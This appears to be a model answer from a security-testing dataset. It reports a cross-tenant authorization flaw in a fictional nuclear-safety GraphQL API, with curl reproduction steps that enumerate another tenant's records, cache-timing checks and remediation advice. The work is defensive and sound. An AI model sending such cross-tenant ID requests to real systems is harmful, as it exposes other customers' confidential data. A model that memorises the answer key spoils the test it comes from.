# Expected Response

## System
- Domain: Nuclear / Safety Systems
- System: ReactorCore Safety API
- Example ID: GQL-0040

## Priority Findings

### Finding 1: Cross-Tenant Bulk Enumeration of Nuclear Safety Records via bulkResourceLookup — Operational Data Leakage (Pattern 7.1)
**Severity:** Critical
**Category:** BOLA / Operational Data Leakage

**Summary:**
The `bulkResourceLookup` mutation on `POST /graphql` accepts an arbitrary array of `resourceId` values without per-ID tenant ownership verification. An attacker from `tenant-2526` submitted IDs `["R-2040", "R-1040", "R-3040"]` and received reactor safety system records belonging to `tenant-b733`, exposing operational data (`sensitiveField: CONFIDENTIAL-2526b733`, `internalNotes: Internal data exposed`). In a nuclear safety domain, this constitutes Pattern 7.1 operational data leakage: not only is the data disclosed in the API response, but the same cross-tenant query populates application logs with sensitive safety records that may be retained, indexed, and accessible beyond the intended security boundary.

**Evidence from HAR:**
- Request: `POST https://api.reactorcore-safety-a.example.com/graphql` (2026-04-13T16:22:34Z, 50 ms)
- JWT `x-tenant-id`: `tenant-2526` — attacker's identity
- Mutation payload: `bulkResourceLookup(ids: ["R-2040", "R-1040", "R-3040"]) { resourceId tenantId data { sensitiveField } }` — bulk cross-tenant IDs
- Response HTTP status: `200 OK` — no authorization error
- Response `tenantId`: `tenant-b733` — cross-tenant safety records returned
- Response `ownerId`: `other-user-2526b733`
- Response `sensitiveField`: `CONFIDENTIAL-2526b733` — operational nuclear safety data leaked
- Response `internalNotes`: `Internal data exposed`
- `x-request-id`: `req-2526b733`
- Response time: 50 ms (cache hit candidate — §2.0: Redis cache keyed by `resourceId` only, no user/tenant dimension)

**Root Cause (§4.0 RISK-GQL-040 + §5.0):** "The `bulkResourceLookup` mutation accepts an arbitrary array of IDs without per-ID ownership filtering." The resolver does not assert `WHERE tenant_id = $jwt.tenantId` for each ID. Additionally, the Redis cache (§2.0) has no tenant dimension, so a prior cache population by `tenant-b733` makes `tenant-2526`'s cross-tenant lookup return in 50 ms — confirming the cache amplifies the data leakage path.

**Evidence Map:**
| Artifact | Location | Detail |
|---|---|---|
| context.txt §4.0 | RISK-GQL-040 | "resolver does NOT verify tenantId against JWT's tenantId" |
| context.txt §4.0 | bulkResourceLookup note | "accepts an arbitrary array of IDs without per-ID ownership filtering" |
| context.txt §2.0 | Caching | "Redis cache keyed by `resourceId` — no user dimension in cache key" |
| HAR entry | request.postData | `bulkResourceLookup(ids: ["R-2040", "R-1040", "R-3040"])` from `tenant-2526` |
| HAR entry | response.content | `tenantId: "tenant-b733"`, `sensitiveField: "CONFIDENTIAL-2526b733"` |
| HAR entry | timings.wait | 50 ms total — consistent with Redis cache hit |

---

### Finding 2: Operational Data in Logs — Pattern 7.1 Logging Failure
**Severity:** High
**Category:** Logging Failures

**Summary:**
Per §5.0 (Pattern 7.1), the successful cross-tenant query populates application logs and audit trails with the leaked `sensitiveField` and `internalNotes` content. Nuclear safety operational data in shared logs violates NRC/IAEA data segregation requirements. The `x-request-id: req-2526b733` confirms the request was logged by the API gateway.

---

## Steps to Reproduce

### Step 1 — Confirm attacker baseline (own tenant bulk lookup)
```bash
curl -s -X POST https://api.reactorcore-safety-a.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-2526" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2526-001\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Expected:** Returns only `tenant-2526` records.

### Step 2 — Cross-tenant bulk nuclear safety data access (HAR attack)
```bash
curl -s -X POST https://api.reactorcore-safety-a.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-2526" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2040\", \"R-1040\", \"R-3040\"]) { resourceId tenantId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable outcome:** Returns `tenantId: "tenant-b733"`, `sensitiveField: "CONFIDENTIAL-2526b733"`, `internalNotes: "Internal data exposed"` — cross-tenant nuclear safety data confirmed. Response in ~50 ms suggests Redis cache hit (no tenant dimension).
**Secure outcome:** HTTP 403 or `{"errors": [{"message": "Forbidden"}], "data": {"bulkResourceLookup": null}}`.

### Step 3 — Verify cache-amplified leak (no new DB query needed)
```bash
# Repeat Step 2 immediately — sub-50 ms response confirms Redis cache hit with no tenant scope
time curl -s -X POST https://api.reactorcore-safety-a.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-2526" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2040\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable outcome:** Response time ≤ 50 ms confirms Redis cache serves cross-tenant data to unauthorized caller.

## Secure Outcome Verification
For **Step 2**, a correctly patched implementation MUST return:
```json
{
  "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }],
  "data": { "bulkResourceLookup": null }
}
```

## Remediation
1. **Per-ID ownership filter in bulkResourceLookup:** Post-fetch, reject any result whose `tenant_id` ≠ JWT's `tenantId`. Return FORBIDDEN for disallowed entries.
2. **Resolver-level tenant guard on getResource:** Apply `WHERE resource_id = $id AND tenant_id = $jwt.tenantId` (§4.0 RISK-GQL-040).
3. **Include tenantId in Redis cache key:** Change from `resourceId` to `resourceId:tenantId` so cross-tenant cache hits are structurally impossible (§2.0).
4. **Sanitize operational data from application logs:** Never log raw `sensitiveField` or `internalNotes` content; log only `resourceId` and `tenantId` for audit (Pattern 7.1 remediation).
5. **Automated regression tests:** Assert `tenant-2526` calling `bulkResourceLookup(["R-2040", ...])` receives FORBIDDEN; assert cache miss on cross-tenant key.
